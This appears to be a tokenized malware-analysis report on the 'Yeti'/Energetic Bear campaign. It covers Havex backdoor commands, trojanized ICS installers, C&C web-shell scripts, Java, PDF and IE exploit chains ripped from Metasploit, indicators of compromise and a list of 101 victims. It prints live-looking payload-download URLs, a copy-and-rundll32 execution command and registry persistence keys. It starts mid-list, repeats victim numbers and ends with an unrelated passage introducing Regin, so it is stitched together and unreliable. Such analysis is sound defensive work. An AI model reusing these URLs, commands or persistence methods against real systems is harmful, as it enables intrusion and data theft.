The UPS command is used to update the C & C server in the registry .
The FIS command is used to check if the file passed as parameter exists on the infected computer .
The FIT command is used to delete a file passed as parameter to the command if it exists on the infected computer .
The CMD command is used to execute a command on the infected machine using cmd.exe The KEY command is used to update the Priv and Pub key in the registry .
Once the commands have been executed , the debug message `` End work '' is displayed .
The malware then sleeps for a random amount of time and the main loop continues .
If the commands were executed , all results stored in the registry will be POSTED to the server via the AnsSend method .
The malware loops forever waiting for new orders from the attackers .
1st stage samples SHA-256 : 1b3cf050d626706d32c1c2c1cbd4975d519cfbdb9bca0f2e66b7e1120030b439 size : 538152 timestamp : Fri , 19 Jun 1992 22:22:17 UTC sources : hXXp : //lafollettewines.com / blog / wp - includes / pomo / inden2i.php ? dwl = fne hXXp : //kenzhebek.com / tiki / files / templates / listpages / inden2i.php ? dwl = fne dropped as : dxpserver.exe , corensys.exe , wbemmonitor.exe detected as : Trojan . Win32.Benban.yc SHA-256 : b1a3e67200a3837ecf45481885c2eca88f89509443a0bcec01b12aa737007a9b size : 248360 timestamp : Fri , 19 Jun 1992 22:22:17 UTC detected as : Trojan - Dropper . Win32.Clons.aqwj SHA-256 : fcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915 size : 271400 timestamp : Fri , 19 Jun 1992 22:22:17 UTC source : www.nahoonservices.com/wp-content/plugins/rss-poster/juch.php dropped as : searchindexer.exe detected as : Trojan - Dropper . Win32.Clons.ampw SHA : a553384eeadf4ad39e6c89bf16a146c01ebf627d042485844d75cd67b421afb8 size : 248360 timestamp : Fri , 19 Jun 1992 22:22:17 UTC signature : Trojan - Dropper . Win32.Clons.apvc This backdoor comes packed with UPX and a custom Delphi packer .
The Delphi packer contains anti- debugging tricks and code especially crafted to overrun sandbox mechanisms .
The packer unpacks and executes the main binary in several stages , creating multiple separated processes and threads .
Code flow : This EXE copies the additional MZ from its overlay to C : \ProgramData\Cap\Cap.exe and runs this file using following command : Then it deletes the directory C : \ProgramData\Cap and all the files in it , deletes itself and exits .
It uses encrypted strings - XOR with progressively incremented value .
3rd stage 3rd party screenshot tool Cap.exe is indeed the DuckLink CmdCapture tool - a 3rd party freeware AutoIt application ( AutoIt version 3.3.6.1 ) for capturing the screenshots , available here This application is dropped by the scs.exe module and run using following command line parameters : /d C : \ProgramData\Mail\MailAg /f scs.jpg > C : \ProgramData\Mail\MailAg\scs.txt The /d parameter specifies the destination directory The /f parameter specifies the filename for the screenshot file .
Text output produced by application is redirected to the C : \ProgramData\Mail\MailAg\scs.txt file and contains information such as : Description of the DuckLink CmdCapture functionalities from the README file that comes with the application : This freeware program designed to capture images of the screen .
Main Features : * Full Screen Capture ( display selection support ) .
* Window Capture .
* Selected area capture .
* Save captured image in silent mode .
* Open captured image in graphic editor .
* Print captured image .
* Put captured image to clipboard .
* Upload captured image ( to image hosting services ) .
* Images format support : PNG GIF JPG - Quality can be set .
BMP - Format can be set .
Example of part of the content of the scs.txt file : @ HOUR : Hours value of clock in 24-hour format .
Range is 00 to 23 Sample Value : 23 @ MDAY : Current day of month .
Range is 01 to 31 Sample Value : 22 @ MIN : Minutes value of clock .
Range is 00 to 59 Sample Value : 19 @ MON : Current month .
Range is 01 to 12 Sample Value : 07 @ MSEC : Milliseconds value of clock .
Range is 00 to 999 Sample Value : 050 @ SEC : Seconds value of clock .
Range is 00 to 59 Sample Value : 52 @ WDAY : Numeric day of week .
Range is 1 to 7 which corresponds to Sunday through Saturday .
Sample Value : 3 @ YDAY : Current day of year .
Range is 001 to 366 ( or 001 to 365 if not a leap year ) Sample Value : 203 @ YEAR : Current four - digit year Sample Value : 2014 @ ComputerName : Computer 's network name .
Sample Value : WINXP @ ComSpec : value of % comspec % , the SPECified secondary COMmand interpreter ; primarily for command line uses , e.g .
Run ( @ ComSpec & `` /k help | more '' ) Sample Value : C : \WINDOWS\system32\cmd.exe @ CPUArch : Returns `` X86 '' when the CPU is a 32-bit CPU and `` X64 '' when the CPU is 64-bit .
Sample Value : X64 @ HomeShare : Server and share name containing current user 's home directory .
Sample Value : @ IPAddress1 : IP address of first network adapter .
Tends to return 127.0.0.1 on some computers .
Sample Value : 192.168.56.11 @ IPAddress2 : IP address of second network adapter .
Returns 0.0.0.0 if not applicable .
Sample Value : 0.0.0.0 @ IPAddress3 : IP address of third network adapter .
Returns 0.0.0.0 if not applicable .
Sample Value : 0.0.0.0 @ IPAddress4 : IP address of fourth network adapter .
Returns 0.0.0.0 if not applicable .
Sample Value : 0.0.0.0 @ LogonDNSDomain : Logon DNS Domain .
Sample Value : @ LogonDomain : Logon Domain .
Sample Value : WINXP -- - snip -- - File listing module SHA-256 : 07bd08b07de611b2940e886f453872aa8d9b01f9d3c61d872d6cfe8cde3b50d4 Size : 15872 Timestamp : Tue , 02 Jul 2013 12:41:47 UTC Source : 91.203.6.71/check2/muees27jxt/fl.exe Detected as : HEUR : Trojan . Win32.Generic Module listing file .
Saves a list of documents that have specified extensions or contain specified strings in the file name to the C : \ ProgramData\Mail\MailAg\fls.txt file .
Saved information includes path , size and modification time .
The C & C Backend is written in PHP , consisting of 3 files .
`` log.php '' is a Web - Shell , used for file level operations .
`` testlog.php '' is not a PHP - script but it contains the C & C Server logfile of Backdoor - connections .
Please see `` source.php '' below for further information .
`` source.php '' The Backdoors interact with `` source.php '' , which is the control script .
Following the functions on execution : 1 .
Collects the following Information : 2 .
Writes the above information to `` testlog.php '' , separated by `` Tabulator '' and base64-encoded , with the following syntax : < timestamp > \t < victim ip - address > \t < proxy > \t < botID > \t < request - uri > \t < useragent > 3 .
Writes all transferred HTTP - GET Variables to `` < botID > .log
'' , separated by `` Tabulator '' and base64-encoded .
4 .
If the bot executed an HTTP - POST - request , the transferred data is written to the file `` < botID > .
ans '' , enclosed in `` xdata '' -Tag with timestamp .
( `` ans '' is the acronym for `` Answer '' ) 5 .
Checks for any file `` < botID > _ * .txt '' a .
If found the timestamp , filename and Status `` sent '' are first appended to `` < botID > .log
'' .
Then the file content is transferred to the bot , embedded into HTML with HTML - Body `` No data ! '' and HTML - Comment `` Havex '' containing the data to be transferred .
Finally the file on the server will be removed .
If removal fails it 's logged to `` < botID > .log
'' .
b .
If no matching file is found , a HTML - Response is sent with an empty `` Havex '' HTML- Comment and HTML - Body text `` Sorry , no data corresponding to your request .
'' The page below shows a brief description of the identified victims including information about the company and the sector on which they operates .
A total of 101 victims have been identified .
Victim 1 Offers a complete range of manufacturing processes including precision injection molding , cleanroom molding and assembly , sheet metal fabrication , supply chain management and distribution .
Victim 2 Ukrainian wholesale suppliers for the pharmaceutical market .
Victim 3 General contracting , design build and construction management company ; based in Alabama .
Victim 4 Company performing web developing , hosting , consulting and content management .
Victim 5 University in Ukraine .
Victim 6 Develops larger machines for international manufacturers – Ireland .
Victim 7 School in Tennessee .
Victim 8 Special Purpose Machines .
Working in several sectors including the pharmaceutical , automotive , printing or plastic industry .
Victim 9 Corporation - Area of activity : Adult Internal Medicine , Infectious Disease , Pediatrics , OB / GYN , Dentistry , Psychology , Psychiatry , Social Services Victim 10 Faculty of Electrical Engineering , Mechanical Engineering and Naval Architecture .
Victim 11 Distributor for construction machinery , energy systems and Caterpillar brand equipment .
Victim 12 One of Northern Ireland 's most respected and innovative construction companies .
Victim 13 Supplier of IT services and products .
Victim 14 Multi - trade company providing high quality electrical , HVAC , IT , across the country ( US ) .
Victim 15 Area of activity : Packaging systems .
HQ in Switzerland .
Victim 16 Web development and hosting including ERP and commercial implementation and consulting services .
HQ : Chile Victim 17 Car dealer in Arizona Victim 18 IT Australia - provides systems to streamline management and governance processes .
Victim 19 Integrated online marketing agency .
Russia .
Victim 20 Design and manufacture of standard and custom leak test machines .
Victim 21 University in Spain .
Victim 22 Towing / hauling solutions to the commercial trucking industry .
Located coast to coast in the U.S. , Canada , Europe , Australia and Mexico .
Victim 23 University in Poland .
Victim 24 Areas of activity : recycling , mining and food sorting .
Victim 25 Systems integrator located in North Carolina .
Specializes in the design and implementation of SCADA systems .
Victim 26 City council - Poland .
Victim 27 University in China .
Victim 28 Cleaning solutions .
Victim 29 Manufacturer of flexible packaging and advanced laminate design solutions .
Victim 30 Custom manufacturing of complex three - dimensional sheet metal parts .
Victim 31 Specializes in mechanical engineering .
Area of activity : Laminating - Machines , Used - Machinery .
Victim 32 Structural engineering field in every major market sector and construction type .
California .
Victim 33 Courier services worldwide .
Greece .
Victim 34 Institute of Physics .
Croatia Victim 35 Supplies public sector organizations with products and contracts .
UK .
Victim 36 University in Spain .
Victim 37 University in Poland .
Victim 38 University in Poland .
Victim 39 Research & Education Network .
USA .
Victim 40 University in Germany .
Victim 41 American multinational technology and consulting corporation .
Victim 42 Creates and manages international private WANs for large multinational companies .
Victim 43 Informatics Centre in India .
Victim 42 Health authority in Canada .
Victim 43 County Government in USA .
Victim 44 University in USA .
Victim 45 American multinational conglomerate corporation .
Victim 46 Unit within University in USA .
Victim 47 Operates high speed computer network in Turkey .
Victim 48 University in Poland .
Victim 49 Telecommunications and computing services .
USA .
Victim 50 American multinational document management corporation .
Victim 51 Major electronic systems company based in France acting in areas such as defense , aerospace , airline security and safety , information technology , and transportation Victim 52 Swiss multinational pharmaceutical company .
Victim 53 American manufacturing conglomerate involved in aircraft , the space industry , defense - oriented and commercial electronics , automotive and truck components .
Victim 54 Industrial suburb in India .
Victim 55 Information Technology company .
Iran .
Victim 56 University in China .
Victim 57 Global payments and technology company .
USA .
Victim 58 College in USA .
Victim 59 University in Germany .
Victim 60 University in UK .
Victim 61 Supercomputing and Networking Center .
Poland .
Victim 62 University in Canada .
Victim 63 University in USA .
Victim 64 University in Spain .
Victim 65 Academic and Research Network .
Ukraine .
Victim 66 University in Canada .
Victim 67 Front , middle , and back office services for global financial markets .
Victim 68 Greek Public Administration Network Victim 69 University in the USA .
Victim 70 University in Russia .
Victim 71 Airport Authority in the USA .
Victim 72 Multinational manufacturer .
Germany .
Victim 73 Energy consumption analysis company .
Victim 74 University in the USA .
Victim 75 University in Taiwan .
Victim 76 University in Japan .
Victim 77 University in Taiwan .
Victim 78 University in the USA .
Victim 79 University in the USA .
Victim 80 University in Sweden .
Victim 81 University in Poland .
Victim 82 Pharma industry .
Victim 83 Digital content for education and research in the UK .
Victim 84 University – weather research .
Victim 85 University in South Korea .
Victim 86 Construction management services .
Victim 87 Education and Research Network , China .
Victim 88 Communications network for science and research , Germany .
Victim 89 University in the USA .
Victim 90 University in Spain .
Victim 91 University in South Korea .
Victim 92 Academic and Research Network , Croatia .
Victim 93 Encryption technology Institute .
Victim 94 University in the USA .
Victim 95 Chemical company , Germany .
Victim 96 School , USA .
Victim 97 University in Ukraine .
Victim 98 Liquefied natural gas , US energy demand .
Victim 99 University in Poland .
Victim 100 Academic and Research Network , Australia .
Victim 101 Space research institute , Russia .
SwissRanger camera driver ( sysmain dropper ) A hijacked installer of libMesaSR used by the `` SwissRanger '' camera driver , produced by Acroname : http : //www.acroname.com/ Files details : SHA-256 : 398a69b8be2ea2b4a6ed23a55459e0469f657e6c7703871f63da63fb04cefe90 Size : 1311927 Compiled : Sat , 28 May 2011 16:04:38 UTC Detected as : Trojan . Win32.Inject.hhwa Description : trojanized installer Path : % TEMP % \tmp687.dll and % APPDATA % \sydmain.dll SHA-256 : a8e6abaa0ddc34b9db6bda17b502be7f802fb880941ce2bd0473fd9569113599 Size : 133152 Compiled : We d , 12 Jun 2013 04:31:14 UTC Detected as : Trojan . Win32.Inject.hhwa Description : Sysmain backdoor Path : % TEMP % \setup.exe SHA-256 : 7fa188fb3bfecbd0fbbb05cfa4a3078ac44f68c63b784b20046e470613e35f96 Size : 1181500 Compiled : Sat , 05 Dec 2009 22:50:52 UTC Description : original installer , version 1.0.14.706 Registry modification : [ HKCU\Software\Microsoft\Windows\CurrentVersion\Run ] load = C : \WINDOWS\system32\rundll32.exe `` c : \documents and settings\luser\application data\sydmain.dll '' , AGTwLoad eWon software ( Havex dropper ) A hijacked installer of eCatcher - a piece of legitimate software developed by a Belgian producer of SCADA and industrial network equipment : http : //www.ewon.be / en / home.html Files details : SHA-256 : 70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9 Size : 43971440 Compiled : Sat , 31 Mar 2007 15:09:46 UTC Detected as : ( not detected yet ) Description : trojanized installer Url : hxxp : //www.ewon.biz / software / eCatcher / eCatcherSetup.exe Path : % TEMP % \TmProvider.dll and % SYSTEM % \TMPProvider.dll SHA-256 : 401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67 Size : 327168 Compiled : Mon , 30 Dec 2013 12:53:48 UTC Description : Havex version 038 Path : % TEMP % \eCatcherSetup.exe SHA-256 : c7caa7fa2a23508b0a024a6a4b2dcaad34ab11ea42dffc3a452901c007cdfc34 Size : 43785864 Compiled : Fri , 19 Jun 1992 22:22:17 UTC Description : original installer , version 4.0.0.13073 Path : % TEMP % \qln.dbx Size : 2 Description : text file with Havex version number Registry modification : [ HKCU / HKLM\Software\Microsoft\Windows\CurrentVersion\Run ] TmProvider = rundll32 `` % SYSTEM % \TMPprovider038.dll '' , RunDllEntry [ HKLM\Software\Microsoft\Internet Explorer\InternetRegistry ] fertger = 269684507736283195770098FD80 - 25 mbCheck software ( Havex dropper ) A hijacked installer of legitimate software for the remote maintenance of PLC systems - mbCHECK produced by MB Connect Line GmbH : http : //www.mbconnectline.com / index.php / en/ Files details : SHA-256 : 0b74282d9c03affb25bbecf28d5155c582e246f0ce21be27b75504f1779707f5 Size : 1141478 Compiled : Sun , 14 Jul 2013 20:09:51 UTC ) Detected as : Trojan - Dropper . Win32.Injector.kcnn Description : Trojanized installer Path : and % SYSTEM % \svcprocess043.dll % TEMP % \mbCHECK.dll SHA-256 : d5687b5c5cec11c851e84a1d40af3ef52607575487a70224f63458c24481076c Size : 437248 Compiled : Fri , 11 Apr 2014 05:37:36 UTC Description : Havex version 043 Resource : 12.MTMxMjMxMg==.5.havex.14400000.12.Explorer . EXE.0.2.66.sinfulce lebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php.90.ra pidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-sett ings / bp - settings - src.php.354.AATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED 9LxIVQr2Z / gsrHIsgTvK9AusdFo+9 .. fzAxf1zXj42880+kUmktmVb5HSYi8T27Q 54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk .. 09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja + Ml4SI7e60C4qDQAAAAAAAAAAAAAAAAAA .. AAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA .. AAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA .. AAAAAAAAAAAAAAAAAAAAAQAB .
29.c8a7af419640516616c342b13efab.29.45474bca5c3a10c8e94e56543c2b d.600000.2000.323000.10.svcprocess .
Path : % TEMP % \mbCHECK.exe SHA-256 : 34254c2decc973dbd8f28b47690f233f5c5d3e1735ee20a6b8dd1dbe80d16d81 Size : 1647104 Compiled : Thu , 25 Jul 2013 13:30:28 UTC Description : original software , version 1.1.1.0 Path : % TEMP % \qln.dbx Size : 2 Description : text file with Havex version number Registry modification : [ HKCU|HKLM ] \Software\Microsoft\Windows\CurrentVersion\Run ] svcprocess = rundll32 `` % SYSTEM % \svcprocess043.dll '' , RunDllEntry [ HKLM\Software\Microsoft\Internet Explorer\InternetRegistry ] fertger = 229182459113651166490098FD80-c8a7af419640516616c342b13efab Second stage tool delivery : kinoporno.org was a confirmed Yeti site .
It served Havex variant ( d532eb6835126e53e7ae491ae29f d8b3 ) at kinoporno.org/Provider.dll .
It also served up the well - known lateral movement utility 64bit Windows Credential Editor tool at kinoporno.org/wce64.exe Another example above included a credential and document stealing component , downloaded as a part of the attack chain from nahoonservices.com : 91.203.6.71/check2/muees27jxt/fl.exe CVE-2011 - 0611 - PDF exploit The exploit is delivered as an XDP file ( XML Data Package ) which is actually a PDF file packaged within an XML container .
This is a known PDF obfuscation method which serves as an additional anti - detection layer .
The XDP file contains an SWF exploit and two files ( encrypted with XOR 0x04 ) stored in the invalid section of the PDF .
One of the files is Havex DLL ( version 038 ) , the other is a small JAR file , which is used to copy and run the DLL by executing the following command : cmd /c copy < fname_passed_as_param > % TEMP % \\explore.dll /y & rundll32.exe % TEMP % \\ explore.dll , RunDllEntry The SWF executes the action script , which contains a shellcode ( encrypted with XOR 0x96 ) and another SWF file ( encrypted with XOR 0x7D ) which uses the CVE-2011 - 0611 vulnerability to run the shellcode .
The shellcode then looks for the signature S18 t in the memory ( which signs the start of encrypted DLL ) , decrypts and loads it .
Files summary : In relation to the Yeti infections , we have discovered a malicious JAVA applet - named googlea .
jar - which was part of the malicious HTML file .
It uses either CVE-2012 - 1723 or CVE-2012 - 4681 , depending on which Java version is running on the victim 's machine .
It downloads payloads to % JAVATMP % \roperXdun.exe ( where X is the sequential number starting from 0 for the payload from the first URL from the list ) and executes them .
The URL list is stored in the `` uid '' parameter in HTML file , so there is no way of checking what the payload was and where it came from without having the original HTML that embedded the malicious applet .
The URLs in the parameter are encrypted in the form of a string composed from numbers from 0 to 71 separated by colons .
Each number represents a different ASCII character .
Almost predictably , this early Yeti pdf exploit is yet another metasploit rip .
The ROP used in this Yeti exploit matches the msf code instruction for instruction .
The pdf stores the Havex downloader in its content , which it writes to % temp % and executes after obtaining control flow from Adobe Reader .
The significant stages of this exploit start by setting up parameters for the vulnerable strcat call in the CoolType SING table parsing library here , in order to overwrite the stack with an appropriate ROP blob .
The code is paused here at the vulnerable strcat call : After the strcat call values smash the stack , an exact copy of the metasploit ROP code delivered by the Yeti exploit pivots from the ( msf - selected ) icucnv36.dll library into the microsoft c runtime to make a memcpy call here : The original 0-day exploiting this Adobe Reader vulnerability targeted icucnv34.dll .
Function call chains for both the Yeti ROP and the msf ROP are as follows : CreateFileA CreateFileMappingA MapViewOfFile save and load the saved mapping ptr memcpy ret back into shellcode for Havex file write to % temp % and execute This work is clearly a rip from metasploit .
CVE-2012 - 5076 - Java exploit www.nahoonservices.com/wp-content/plugins/rss-poster/dgoat.jar → www.nahoonservices.com / wp- content / plugins / rss - poster / jungle.php ( TmpProvider0.dll , 2e39e7bd5d566893fe3df0c7e145d83a ) dgoat.jar │ └───dgoat │ EvilPolicy.class , 761 bytes │ Mosdef.class , 2176 bytes │ SiteError $ 1.class , 1976 bytes │ SiteError.class , 4347 bytes │ └───META - INF MANIFEST.MF , `` Manifest - Version : 1.0 '' Another exploit ripping metasploit code .
This exploit was first seen on a large scale when exploit code targeting cve-2012 - 5076 was included in the `` Cool Exploit '' pack .
The flaw lies in the configuration of the JRE itself and enables untrusted applets to access dangerous packages .
In other words , `` com.sun.org.glassfish . , \ '' was left out of the checkPackageAccess list in the java.security file .
From the unrestricted com.sun.org.glassfish .
* package , the untrusted applets can create a class with elevated privilege .
In this case , one of the exposed `` dangerous '' packages happens to be com.sun .
org.glassfish.gmbal , which you can see imported by `` SiteError.class '' : Also in that class file is the trigger itself , where a malicious class is loaded on the fly by the unrestricted `` GenericConstructor '' code that should not have been available to an untrusted applet .
The new instance of localClass created from smd_bytes is nothing more than a call to set the SecurityManager value to null , effectively turning off the JRE sandbox security access features .
The exploit maintains a class in the byte array : And when decoded , the contents of this smd_bytes array are in fact `` SecurityManagerDisabler .
class '' : After SecurityManagerDisabler.class disables the JRE SecurityManager , SiteError.class code loads the Mosdef.class , which downloads and runs another Havex backdoor .
It downloads www.nahoonservices.com/wp-content/plugins/rss-poster/jungle.php to % temp % , renames it to TMPprovider0.dll and executes the Havex code : This exploit is ripped almost directly from the metasploit framework - it 's simply modified with an additional string obfuscation handling method .
The obfuscation code in this java exploit is fairly weak but effective in modifying the metasploit code just enough to cover up similarities .
The exploit code was only slightly modified here to demonstrate the crypto routine and hardcoded string values for the payload url and filepath : Output here : The exploit itself is finicky .
It is another rip of the corresponding metasploit code , with minor modifications .
See `` Obvious Metasploit Rips '' below .
The shellcode delivered with the exploit is nothing out of the ordinary , using expected thread environment variables to identify module locations in the memory ...
The shellcode gets more interesting due to the manner in which the download url string was built .
The encoding algo was a simple additive 0x1010101 against every four bytes of the reversed string '' kenzhebek.com/tiki/files/templates/listpages/hoem.php '' , which was downloaded as a Havex backdoor .
The decoder looks like this ...
Identifying the clsid used in this script is a giveaway on the targeted MS XML Core Services software : Of course , most of this code appears to be ripped from the corresponding metasploit exploit code .
Interestingly , the metasploit code was derived from 0day Itw at the time in June 2013 .
But the attackers did n't use it until after the vulnerability was patched .
The Yeti attackers simply did not need a 0-day arsenal .
The attackers must have known or expected that they were targeting Internet Explorer 7 on the victims ' systems .
The later , updated versions of the corresponding metasploit code maintain ROP to evade problems with attacking IE 8 + ASLR / DEP protections , but the Yeti code does not .
This absence is somewhat odd , because KSN events indicate the code was active in August 2013 , and the metasploit dev added ROP to their code in June 2013 .
The shellcode delivered from this exploit also includes an unusual url and filename string build routine : The decoded strings here : The Yeti exploits are ripped line - for - line from the metasploit framework .
For example , class files served from www.nahoonservices.com/wp-content/plugins/rss-poster/start .
jar include code pulled from the msf .
From the Yeti LyvAGalW.class file : And for comparison , here is the java exploit code from metasploit framework : github.com/rapid7/ metasploit - framework / blob / master / external / source / exploits / cve-2013 - 1488/Exploit.java : Yeti 's delivery of CVE-2013 - 1347 from nahoonservices.com/wp-content/plugins/rss-poster/negc .
html displays much the same level of technical originality .
From negc.html The matching CVE-2013 - 1347 code pulled from msf https : //github.com / rapid7/metasploit - framework / blob / master / modules / exploits / windows/ browser / ie_cgenericelement_uaf.rb ( minor modifications made to its shellcode build algorithm .
Actually , the Yeti version is dumbed down , when compared to the metasploit framework version ) : In earlier cases ( July 2013 ) , successful Java exploitation served from nahoonservices.com would cascade into more Yeti components planted on victim systems .
The java exploit in turn downloaded Karagany backdoors , which in turn downloaded stealers from 91.203.6.71 : User visits utilico.co.uk → redirected to → nahoonservices.com → Java Exploits → www.nahoonservices.com/wp-content/plugins/rss-poster/start.jar www.nahoonservices.com/wp-content/plugins/rss-poster/juch.php a615d71af0c856c89bb8ebb5c6e7644d fcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915 juch.php saved as `` searchindexer.exe '' , or `` coresyns.exe '' and run , then downloads and runs ...
→ 91.203.6.71/check2/muees27jxt/fl.exe 4bfdda1a5f21d56afdc2060b9ce5a170 07bd08b07de611b2940e886f453872aa8d9b01f9d3c61d872d6cfe8cde3b50d4 → 91.203.6.71/check2/muees27jxt/scs.exe da94235635f61a06a35882d30c7b62b3 05fb04474a3785995508101eca7affd8c89c658f7f9555de6d6d4db40583ac53 In a later incident , KSN data recorded one origin of these exploits as : hxxp : //keeleux.com / sfreg / img / nav / gami.jar and hxxp : //keeleux.com / sfreg / img / nav / stoh.jar ( ab580bd7a1193fe01855a6b8bd8f456b ) The file `` stoh.jar '' includes `` DownloadExec.class '' , which maintains a hardcoded string to the URL .
This string appears to be more commonly implemented at the active exploit sites : hxxp : //keeleux.com / sfreg / img / nav / iden21php ? dwl = fne It writes out the TmpProvider.dll Havex loader downloaded from this resource and runs it using '' rundll32.exe '' .
eWON trojanized installer detail : hxxp : //www.ewon.biz / software / eCatcher / eCatcherSetup.exe ( eb0dacdc8b346f44c8c370408bad43 06,70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9 ) Havex loader version 038 ( 401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67 ) dropped as TmpProvider.dll .
Internet Explorer CVE-2013 - 1347 http : //www.cve.mitre.org / cgi - bin / cvename.cgi ? name = CVE-2013 - 1347 '' Microsoft Internet Explorer 8 does not properly handle objects in memory , which allows remote attackers to execute arbitrary code by accessing an object that ( 1 ) was not properly allocated or ( 2 ) is deleted , as exploited in the wild in May 2013 .
'' CVE-2012 - 1889 http : //www.cve.mitre.org / cgi - bin / cvename.cgi ? name = CVE-2012 - 1889 '' Microsoft XML Core Services 3.0 , 4.0 , 5.0 , and 6.0 accesses uninitialized memory locations , which allows remote attackers to execute arbitrary code or cause a denial of service ( memory corruption ) via a crafted web site .
'' Java CVE-2013 - 1488 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = CVE-2013 - 1488 '' The Java Runtime Environment ( JRE ) component in Oracle Java SE 7 Update 17 and earlier , and OpenJDK 6 and 7 , allows remote attackers to execute arbitrary code via unspecified vectors involving reflection , Libraries , `` improper toString calls , '' and the JDBC driver manager , as demonstrated by James Forshaw during a Pwn2Own competition at CanSecWest 2013 .
'' CVE-2012 - 1723 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = CVE-2012 - 1723 '' Unspecified vulnerability in the Java Runtime Environment ( JRE ) component in Oracle Java SE 7 update 4 and earlier , 6 update 32 and earlier , 5 update 35 and earlier , and 1.4.2_37 and earlier allows remote attackers to affect confidentiality , integrity , and availability via unknown vectors related to Hotspot .
'' CVE-2012 - 5076 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = cve - cve-2012 - 5076 Unspecified vulnerability in the Java Runtime Environment ( JRE ) component in Oracle Java SE 7 Update 7 and earlier allows remote attackers to affect confidentiality , integrity , and availability , related to JAX - WS .
CVE-2013 - 2465 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = cve-2013 - 2465 '' Unspecified vulnerability in the Java Runtime Environment ( JRE ) component in Oracle Java SE 7 Update 21 and earlier , 6 Update 45 and earlier , and 5.0 Update 45 and earlier , and OpenJDK 7 , allows remote attackers to affect confidentiality , integrity , and availability via unknown vectors related to 2D .
NOTE : the previous information is from the June 2013 CPU .
Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to `` Incorrect image channel verification '' in 2D .
'' CVE-2013 - 2423 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = cve-2013 - 2423 '' Unspecified vulnerability in the Java Runtime Environment ( JRE ) component in Oracle Java SE 7 Update 17 and earlier , and OpenJDK 7 , allows remote attackers to affect integrity via unknown vectors related to HotSpot .
NOTE : the previous information is from the April 2013 CPU .
Oracle has not commented on claims from the original researcher that this vulnerability allows remote attackers to bypass permission checks by the MethodHandles method and modify arbitrary public final fields using reflection and type confusion , as demonstrated using integer and double fields to disable the security manager .
'' CVE-2012 - 4681 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = cve-2012 - 4681 Multiple vulnerabilities in the Java Runtime Environment ( JRE ) component in Oracle Java SE 7 Update 6 and earlier allow remote attackers to execute arbitrary code via a crafted applet that bypasses SecurityManager restrictions by ( 1 ) using com.sun.beans.finder.ClassFinder.findClass and leveraging an exception with the forName method to access restricted classes from arbitrary packages such as sun.awt.SunToolkit , then ( 2 ) using `` reflection with a trusted immediate caller '' to leverage the getField method to access and modify private fields , as exploited in the wild in August 2012 using Gondzz.class and Gondvv.class .
CVE-2013 - 0422 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = cve - cve-2013 - 0422 Multiple vulnerabilities in Oracle Java 7 before Update 11 allow remote attackers to execute arbitrary code by ( 1 ) using the public getMBeanInstantiator method in the JmxMBeanServer class to obtain a reference to a private MBeanInstantiator object , then retrieving arbitrary Class references using the findClass method , and ( 2 ) using the Reflection API with recursion in a way that bypasses a security check by the java.lang.invoke.MethodHandles.Lookup.checkSecurityManager method due to the inability of the sun.reflect.Reflection.getCallerClass method to skip frames related to the new reflection API , as exploited in the wild in January 2013 , as demonstrated by Blackhole and Nuclear Pack , and a different vulnerability than CVE-2012 - 4681 and CVE-2012 - 3174 .
NOTE : some parties have mapped the recursive Reflection API issue to CVE-2012 - 3174 , but CVE-2012 - 3174 is for a different vulnerability whose details are not public as of 20130114 .
CVE-2013 - 0422 covers both the JMX / MBean and Reflection API issues .
NOTE : it was originally reported that Java 6 was also vulnerable , but the reporter has retracted this claim , stating that Java 6 is not exploitable because the relevant code is called in a way that does not bypass security checks .
NOTE : as of 20130114 , a reliable third party has claimed that the findClass / MBeanInstantiator vector was not fixed in Oracle Java 7 Update 11 .
If there is still a vulnerable condition , then a separate CVE identifier might be created for the unfixed issue .
Mozilla Firefox CVE-2013 - 1690 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = cve-2013 - 1690 '' Mozilla Firefox before 22.0 , Firefox ESR 17.x before 17.0.7 , Thunderbird before 17.0.7 , and Thunderbird ESR 17.x before 17.0.7 do not properly handle onreadystatechange events in conjunction with page reloading , which allows remote attackers to cause a denial of service ( application crash ) or possibly execute arbitrary code via a crafted web site that triggers an attempt to execute data at an unmapped memory location .
'' Adobe Reader CVE-2010 - 2883 https : //cve.mitre.org / cgi - bin / cvename.cgi ? name = cve-2010 - 2883 Stack - based buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4 , and 8.x before 8.2.5 on Windows and Mac OS X , allows remote attackers to execute arbitrary code or cause a denial of service ( application crash ) via a PDF document with a long field in a Smart INdependent Glyphlets ( SING ) table in a TTF font , as exploited in the wild in September 2010 .
NOTE : some of these details are obtained from third party information .
In the spring of 2012 , following a Kaspersky Lab presentation on the unusual facts surrounding the Duqu malware ( http : //www.kaspersky.com / about / press / major_malware_outbreaks / duqu ) , a security researcher contacted us and mentioned that Duqu reminded him of another high - end malware incident .
Although he could n't share a sample , the researcher mentioned ' Regin ' , a type of malware attack that is now dreaded by security administrators in many government agencies around the world .
For the past three years we have been tracking this most elusive malware all around the world .
From time to time samples would appear on various multi - scanner services , but they were all unrelated to each other , cryptic in functionality , and lacking in context .
It is unknown exactly when the first samples of Regin appeared in the wild .
Some of them have timestamps dating back to 2003 .
